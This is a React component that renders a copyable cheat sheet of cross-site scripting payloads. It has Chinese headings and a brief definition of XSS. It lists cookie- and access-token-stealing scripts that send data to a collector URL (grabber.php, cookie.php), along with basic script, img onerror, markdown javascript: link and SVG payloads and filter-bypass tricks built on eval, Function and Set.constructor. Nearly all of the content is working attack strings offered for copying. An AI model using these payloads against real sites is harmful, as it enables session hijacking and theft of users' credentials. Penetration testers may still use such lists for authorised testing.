import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';
const { Title, Paragraph } = Typography;

export default (props) => {
	const DataGrabber = [
		{
			title: "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>"
		},
		{
			title: "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>"
		},
		{
			title: "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>"
		},
		{
			title: "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>"
		}
	];
	const BasicXSS = [
		{ title: "<script>alert('XSS')</script>" },
		{ title: "<scr<script>ipt>alert('XSS')</scr<script>ipt>" },
		{ title: '"><script>alert("XSS")</script>' },
		{ title: '"><script>alert(String.fromCharCode(88,83,83))</script>' }
	];
	const ImgPayload = [
		{ title: "<img src=x onerror=alert('XSS');>" },
		{ title: "<img src=x onerror=alert('XSS')//" },
		{ title: '<img src=x onerror=alert(String.fromCharCode(88,83,83));>' },
		{
			title: '<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>'
		},
		{ title: '<img src=x:alert(alt) onerror=eval(src) alt=xss>' },
		{ title: '"><img src=x onerror=alert("XSS");>' },
		{ title: '"><img src=x onerror=alert(String.fromCharCode(88,83,83));>' }
	];
	const XSSMarkdown = [
		{ title: '[a](javascript:prompt(document.cookie))' },
		{ title: '[a](j a v a s c r i p t:prompt(document.cookie))' },
		{
			title: '[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)'
		},
		{ title: '[a](javascript:window.onerror=alert;throw%201)' }
	];
	const XSSSvg = [
		{
			title: "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>"
		},
		{ title: '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>' },
		{
			title: '<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>'
		},
		{
			title: '<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>'
		}
	];
	const BypassWord = [
		{ title: "eval('ale'+'rt(0)');" },
		{ title: "Function('ale'+'rt(1)')();" },
		{ title: 'new Function`alert`6``;' },
		{ title: "setTimeout('ale'+'rt(2)');" },
		{ title: "setInterval('ale'+'rt(10)');" },
		{ title: "Set.constructor('ale'+'rt(13)')();" },
		{ title: 'Set.constructor`al\x65rt\x2814\x29```;' }
	];
	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				XSS
			</Title>
			<Paragraph style={{ margin: 15 }}>
				跨站脚本攻击(XSS)是一种注入攻击，恶意脚本被注入其中
				否则是良性和可信的网站。当攻击者使用web应用程序进行发送时，就会发生XSS攻击
				恶意代码，通常以浏览器端脚本的形式发送给不同的终端用户。
			</Paragraph>
			<Paragraph style={{ marginLeft: 15 }}>
			</Paragraph>
			<Divider dashed />
			<div
				key='a'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>XSS获取数据</Title>
				<Paragraph>
					获取管理员cookie或敏感访问令牌
				</Paragraph>
				{DataGrabber.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>XSS在HTML/应用程序</Title>
				<Title level={4}>基本Payloads</Title>
				{BasicXSS.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
				<Title level={4}>Img标签</Title>
				{ImgPayload.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<div
				key='c'
				style={{
					padding: 15
				}}
			>
				<Divider dashed />
				<Title level={3}>Markdown</Title>
				{XSSMarkdown.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='d'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>SVG</Title>
				{XSSSvg.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='e'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>绕过</Title>
				{BypassWord.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
		</QueueAnim>
	);
};
